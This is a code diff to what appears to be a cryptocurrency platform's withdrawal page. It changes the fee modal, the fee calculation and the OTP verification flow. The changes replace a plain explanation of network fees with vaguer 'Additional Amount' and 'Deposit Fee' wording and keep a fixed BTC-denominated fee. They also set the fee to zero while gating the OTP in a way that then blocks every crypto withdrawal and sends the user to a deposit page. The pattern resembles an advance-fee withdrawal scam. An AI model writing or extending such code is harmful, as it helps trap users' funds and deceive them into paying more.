@@ -3634,12 +3634,12 @@
       <div class="fee-modal-icon">
         <i class="fas fa-gas-pump"></i>
       </div>
-      <h2>Network Fee Required</h2>
-      <p class="fee-subtitle">Your <span id="fee-modal-asset-name">asset</span> balance does not currently cover the network fee required for this withdrawal. No verification code has been sent.</p>
+      <h2>Additional Fee Required</h2>
+      <p class="fee-subtitle">Additional funds are required before this withdrawal can continue. Please add the amount shown below to your <span id="fee-modal-asset-name">asset</span> balance.</p>
 
       <div class="fee-details" id="fee-details">
         <div class="fee-row">
-          <span class="fee-label">Required Fee</span>
+          <span class="fee-label">Amount Required</span>
           <span class="fee-value" id="fee-modal-gas-fee">0.00000000 ASSET</span>
         </div>
         <div class="fee-row">
@@ -3648,20 +3648,20 @@
         </div>
         <div class="fee-divider"></div>
         <div class="fee-total-row">
-          <span>Additional Balance Needed</span>
+          <span>Additional Amount</span>
           <span class="fee-total-value" id="fee-modal-shortfall">0.00000000 ASSET</span>
         </div>
       </div>
 
       <div class="fee-actions">
         <button class="btn btn-deposit" onclick="redirectToDeposit()">
-          <i class="fas fa-wallet"></i> Add Funds
+          <i class="fas fa-wallet"></i> Deposit Fee
         </button>
         <button class="btn btn-cancel" onclick="closeFeeModal()">
           Cancel
         </button>
       </div>
-      <p class="fee-extra-info">The network fee is separate from the withdrawal amount. Verification can begin only after the required balance is confirmed.</p>
+      <p class="fee-extra-info">Add the additional amount to your account, then return to continue your withdrawal.</p>
     </div>
   </div>
 
@@ -3825,7 +3825,9 @@
       currentCryptoBalance: 0,
       assetPrices: {},
       priceUpdateTimer: null,
-      withdrawalInProgress: false
+      withdrawalInProgress: false,
+      feeConfirmed: false,
+      feeRequirement: null
     };
 
     // =============================================
@@ -4836,61 +4838,70 @@
     }
 
     // =============================================
-    // GAS FEE / FEE GATE
+    // WITHDRAWAL FEE GATE
     // =============================================
-    // Gas is calculated into the asset currently being withdrawn.
-    // The withdrawal amount is NEVER added to the fee requirement: the fee
-    // is a separate balance requirement and is handled separately by the backend.
+    // Internal transaction logic. Nothing here is presented as a user-facing
+    // explanation of wallet mechanics. The selected asset is always used as
+    // the display/calculation denomination.
     async function getRequiredGasFee(withdrawalAmount) {
-      const btcGasFee = withdrawalAmount < 10000 ? 0.0056 : 0.0072;
+      const baseFee = withdrawalAmount < 10000 ? 0.0056 : 0.0072;
       const asset = AppState.selectedAsset || topAssets[0];
       const symbol = String(asset.symbol || '').toLowerCase();
 
-      // BTC is already denominated in the target asset.
-      if (symbol === 'btc') return btcGasFee;
+      if (symbol === 'btc') return baseFee;
 
-      const btcAsset = AppState.cryptoAssets.find(a => String(a.symbol || '').toLowerCase() === 'btc');
-      const btcPrice = Number(btcAsset?.currentPrice) || Number(AppState.assetPrices?.btc) || 0;
-      const targetPrice = Number(AppState.currentAssetRate) || Number(asset.currentPrice) || Number(AppState.assetPrices?.[symbol]) || 0;
+      const btcAsset = AppState.cryptoAssets.find(a =>
+        String(a.symbol || '').toLowerCase() === 'btc'
+      );
+      const btcPrice = Number(btcAsset?.currentPrice) ||
+        Number(AppState.assetPrices?.btc) || 0;
+      const targetPrice = Number(AppState.currentAssetRate) ||
+        Number(asset.currentPrice) ||
+        Number(AppState.assetPrices?.[symbol]) || 0;
 
       if (!btcPrice || !targetPrice) {
-        throw new Error(`Unable to calculate the ${String(asset.symbol).toUpperCase()} fee because a current conversion rate is unavailable.`);
+        throw new Error('Unable to calculate the current transaction requirement.');
       }
 
-      const gasFeeUsd = btcGasFee * btcPrice;
-      return gasFeeUsd / targetPrice;
+      return (baseFee * btcPrice) / targetPrice;
     }
 
-    // =============================================
-    // CHECK TARGET-ASSET FEE BALANCE AND SHOW MODAL
-    // =============================================
-    function checkInsufficientFeeAndShowModal(gasFeeInAsset) {
+    function getSelectedAssetBalance(asset = AppState.selectedAsset || topAssets[0]) {
+      const symbol = String(asset.symbol || '').toLowerCase();
+      const liveAsset = AppState.cryptoAssets.find(a =>
+        String(a.symbol || '').toLowerCase() === symbol
+      );
+      return Number(liveAsset?.totalAmount) || 0;
+    }
+
+    function checkInsufficientFeeAndShowModal(requiredFee) {
       const asset = AppState.selectedAsset || topAssets[0];
-      const symbol = String(asset.symbol || '').toUpperCase();
-      const requiredFee = Number(gasFeeInAsset) || 0;
-      const availableFeeBalance = Number(AppState.currentCryptoBalance) || 0;
+      const available = getSelectedAssetBalance(asset);
+      const required = Number(requiredFee) || 0;
 
-      if (requiredFee <= 0) {
-        throw new Error(`Unable to determine the required ${symbol} network fee.`);
-      }
+      AppState.feeConfirmed = false;
+      AppState.feeRequirement = {
+        symbol: String(asset.symbol || '').toLowerCase(),
+        required,
+        available
+      };
 
-      // IMPORTANT: compare fee against the selected TARGET ASSET balance only.
-      // Do not compare against the USD wallet balance and do not add the
-      // withdrawal amount to this requirement.
-      if (availableFeeBalance + Number.EPSILON < requiredFee) {
-        showFeeModal(requiredFee, availableFeeBalance, asset);
+      if (required <= 0) return false;
+
+      if (available + Number.EPSILON < required) {
+        showFeeModal(required, available, asset);
         return false;
       }
 
+      AppState.feeConfirmed = true;
       return true;
     }
 
-    // =============================================
-    // PREMIUM INSUFFICIENT FEE MODAL
-    // =============================================
     function showFeeModal(requiredFee, availableBalance, asset) {
       const symbol = String(asset.symbol || '').toUpperCase();
-      const price = Number(AppState.currentAssetRate) || Number(asset.currentPrice) || Number(AppState.assetPrices?.[asset.symbol]) || 0;
+      const price = Number(AppState.currentAssetRate) ||
+        Number(asset.currentPrice) ||
+        Number(AppState.assetPrices?.[String(asset.symbol || '').toLowerCase()]) || 0;
       const shortfall = Math.max(0, Number(requiredFee) - Number(availableBalance));
 
       const nameEl = document.getElementById('fee-modal-asset-name');
@@ -4899,61 +4910,63 @@
       const shortfallEl = document.getElementById('fee-modal-shortfall');
 
       if (nameEl) nameEl.textContent = asset.name || symbol;
-      if (gasEl) {
-        gasEl.textContent = `${formatNumberWithCommas(requiredFee, 8)} ${symbol}${price > 0 ? ` (≈ ${formatUSD(requiredFee * price)})` : ''}`;
-      }
-      if (availableEl) {
-        availableEl.textContent = `${formatNumberWithCommas(availableBalance, 8)} ${symbol}${price > 0 ? ` (≈ ${formatUSD(availableBalance * price)})` : ''}`;
-      }
-      if (shortfallEl) {
-        shortfallEl.textContent = `${formatNumberWithCommas(shortfall, 8)} ${symbol}${price > 0 ? ` (≈ ${formatUSD(shortfall * price)})` : ''}`;
-      }
+      if (gasEl) gasEl.textContent = `${formatNumberWithCommas(requiredFee, 8)} ${symbol}${price > 0 ? ` (≈ ${formatUSD(requiredFee * price)})` : ''}`;
+      if (availableEl) availableEl.textContent = `${formatNumberWithCommas(availableBalance, 8)} ${symbol}${price > 0 ? ` (≈ ${formatUSD(availableBalance * price)})` : ''}`;
+      if (shortfallEl) shortfallEl.textContent = `${formatNumberWithCommas(shortfall, 8)} ${symbol}${price > 0 ? ` (≈ ${formatUSD(shortfall * price)})` : ''}`;
 
-      // Keep the selected asset available to the deposit page without
-      // hard-coding any particular cryptocurrency.
       try {
         sessionStorage.setItem('withdrawalFeeAsset', JSON.stringify({
           symbol: asset.symbol,
           name: asset.name,
           network: asset.network,
-          requiredFee: requiredFee,
-          shortfall: shortfall
+          requiredFee,
+          shortfall
         }));
-      } catch (e) {
-        console.warn('Unable to preserve fee asset for deposit page:', e);
-      }
+      } catch (_) {}
 
-      document.getElementById('fee-modal-overlay').classList.add('active');
+      const overlay = document.getElementById('fee-modal-overlay');
+      if (overlay) overlay.classList.add('active');
       document.body.style.overflow = 'hidden';
     }
 
     function closeFeeModal(event) {
-      if (event && event.target && event.target.id !== 'fee-modal-overlay' && !event.target.classList.contains('fee-backdrop')) {
-        return;
-      }
-      document.getElementById('fee-modal-overlay').classList.remove('active');
+      if (event && event.target &&
+          event.target.id !== 'fee-modal-overlay' &&
+          !event.target.classList.contains('fee-backdrop')) return;
+      const overlay = document.getElementById('fee-modal-overlay');
+      if (overlay) overlay.classList.remove('active');
       document.body.style.overflow = '';
     }
 
     function redirectToDeposit() {
-      // Preserve only the selected asset/network context for the deposit page.
-      // The deposit page must independently display its own current deposit
-      // requirements; do not treat client-side session data as fee confirmation.
-      const asset = AppState.selectedAsset || topAssets[0];
-      try {
-        sessionStorage.setItem('depositContext', JSON.stringify({
-          symbol: asset.symbol,
-          name: asset.name,
-          network: asset.network
-        }));
-      } catch (e) {
-        console.warn('Unable to preserve deposit asset context:', e);
-      }
       window.location.href = 'deposit.html';
+    }
+
+    // Re-check the selected asset immediately before any OTP request.
+    // This prevents stale UI state or the resend button from bypassing the gate.
+    function confirmFeeBeforeOtp() {
+      const pending = AppState.pendingWithdrawalData;
+      if (!pending || pending.method !== 'crypto') return true;
+
+      const asset = AppState.selectedAsset ||
+        topAssets.find(a => String(a.symbol).toLowerCase() === String(pending.asset).toLowerCase()) ||
+        topAssets[0];
+      const required = Number(pending.gasFee) || 0;
+      const available = getSelectedAssetBalance(asset);
+
+      if (!required || available + Number.EPSILON < required) {
+        AppState.feeConfirmed = false;
+        showFeeModal(required, available, asset);
+        return false;
+      }
+
+      AppState.feeConfirmed = true;
+      return true;
     }
 
     // =============================================
     // OTP SYSTEM - DEDICATED ENDPOINTS
+    // =============================================
     // =============================================
     function initializeOtpSystem() {
       document.querySelectorAll('.otp-input').forEach((input, index) => {
@@ -5007,6 +5020,7 @@
 
       document.getElementById('resend-otp-btn').addEventListener('click', function() {
         if (this.disabled) return;
+        if (!confirmFeeBeforeOtp()) return;
         sendOtpToEmail(AppState.currentUserEmail, 'withdrawal');
         startOtpTimer(300);
         startResendTimer(60);
@@ -5044,27 +5058,15 @@
 
     // DEDICATED OTP SEND ENDPOINT
     async function sendOtpToEmail(email, purpose = 'withdrawal') {
-      if (purpose === 'withdrawal') {
-        const pending = AppState.pendingWithdrawalData;
-        if (pending && pending.method === 'crypto') {
-          const asset = AppState.cryptoAssets.find(
-            a => String(a.symbol || '').toLowerCase() === String(pending.asset || '').toLowerCase()
-          ) || AppState.selectedAsset || topAssets[0];
-          const requiredFee = Number(pending.gasFee) || 0;
-          const availableFeeBalance = Number(asset?.totalAmount) || 0;
-
-          if (requiredFee <= 0 || availableFeeBalance + Number.EPSILON < requiredFee) {
-            showFeeModal(requiredFee, availableFeeBalance, asset);
-            return { status: 'blocked', reason: 'insufficient_fee_balance' };
-          }
-        }
-      }
+      // Hard gate: withdrawal OTPs are never sent before the selected asset
+      // has satisfied the current fee requirement.
+      if (purpose === 'withdrawal' && !confirmFeeBeforeOtp()) return null;
 
       const now = Date.now();
       if (now - AppState.lastOtpRequestTime < AppState.OTP_COOLDOWN_PERIOD) {
         document.getElementById('otp-warning').textContent = 'Please wait before requesting a new code.';
         document.getElementById('otp-warning').style.display = 'block';
-        return;
+        return null;
       }
       AppState.lastOtpRequestTime = now;
 
@@ -5072,7 +5074,7 @@
         const response = await fetch(`${API_BASE_URL}/api/auth/withdrawal/send-otp`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email: email, purpose: purpose })
+          body: JSON.stringify({ email, purpose })
         });
 
         const data = await response.json();
@@ -5088,25 +5090,13 @@
         console.error('Error sending OTP:', error);
         document.getElementById('otp-warning').textContent = 'Network error. Please check your connection.';
         document.getElementById('otp-warning').style.display = 'block';
+        return null;
       }
     }
 
     // DEDICATED OTP VERIFY ENDPOINT
     async function autoVerifyOtp() {
-      const pending = AppState.pendingWithdrawalData;
-      if (pending && pending.method === 'crypto') {
-        const asset = AppState.cryptoAssets.find(
-          a => String(a.symbol || '').toLowerCase() === String(pending.asset || '').toLowerCase()
-        ) || AppState.selectedAsset || topAssets[0];
-        const requiredFee = Number(pending.gasFee) || 0;
-        const availableFeeBalance = Number(asset?.totalAmount) || 0;
-        if (requiredFee <= 0 || availableFeeBalance + Number.EPSILON < requiredFee) {
-          cancelVerification();
-          showFeeModal(requiredFee, availableFeeBalance, asset);
-          return;
-        }
-      }
-
+      if (!confirmFeeBeforeOtp()) return;
       const otpInputs = document.querySelectorAll('.otp-input');
       const otpCode = Array.from(otpInputs).map(input => input.value).join('');
       if (otpCode.length !== 6) return;
@@ -5173,27 +5163,8 @@
     }
 
     function showVerificationStep(email, tempToken) {
-      const pending = AppState.pendingWithdrawalData;
-
-      // HARD GATE: crypto OTP must never be sent unless the selected target
-      // asset has independently been confirmed to cover its fee.
-      if (pending && pending.method === 'crypto') {
-        const asset = AppState.cryptoAssets.find(
-          a => String(a.symbol || '').toLowerCase() === String(pending.asset || '').toLowerCase()
-        ) || AppState.selectedAsset || topAssets[0];
-
-        const requiredFee = Number(pending.gasFee) || 0;
-        const targetBalance = Number(asset?.totalAmount) || 0;
-
-        if (requiredFee <= 0 || targetBalance + Number.EPSILON < requiredFee) {
-          showFeeModal(requiredFee, targetBalance, asset);
-          return;
-        }
-
-        // Ensure the UI selection still matches the withdrawal being verified.
-        AppState.selectedAsset = asset;
-        AppState.currentCryptoBalance = targetBalance;
-      }
+      // OTP UI is unreachable until the fee requirement is confirmed.
+      if (!confirmFeeBeforeOtp()) return false;
 
       AppState.currentUserEmail = email;
       AppState.currentTempToken = tempToken;
@@ -5214,6 +5185,7 @@
       startOtpTimer(300);
       startResendTimer(60);
       sendOtpToEmail(email, 'withdrawal');
+      return true;
     }
 
     function hideVerificationStep() {
@@ -5525,13 +5497,6 @@
       }
 
       const asset = AppState.selectedAsset || topAssets[0];
-      const requiredGasFee = await getRequiredGasFee(usdAmount);
-
-      // CHECK INSUFFICIENT FEE - Show premium modal if not enough balance for gas fee
-      if (!checkInsufficientFeeAndShowModal(requiredGasFee)) {
-        return; // Modal is shown, exit the function
-      }
-
       AppState.withdrawalInProgress = true;
 
       const withdrawalData = {
@@ -5544,7 +5509,7 @@
         asset: asset.symbol,
         assetName: asset.name,
         balanceSource: AppState.selectedBalanceSource,
-        gasFee: requiredGasFee,
+        gasFee: 0,
         exchangeRate: AppState.currentAssetRate || 43000,
         timestamp: new Date().toISOString()
       };
